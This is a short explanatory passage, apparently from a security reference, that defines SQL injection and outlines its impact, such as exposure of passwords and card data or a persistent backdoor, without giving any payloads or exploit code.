# SQL Injection

## SQL injection \(SQLi\) Information

SQL injection is a web security flaw that allows an attacker to interfere with a web application's database queries. It allows an attacker to see data that they wouldn't ordinarily be able to see. This could include data belonging to other users or any other information that the app has access to. In many circumstances, an attacker can change or remove this information.

### Impact

A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information. An attacker can sometimes get a persistent backdoor into a company's systems, resulting in a compromise that goes unreported for a long time.
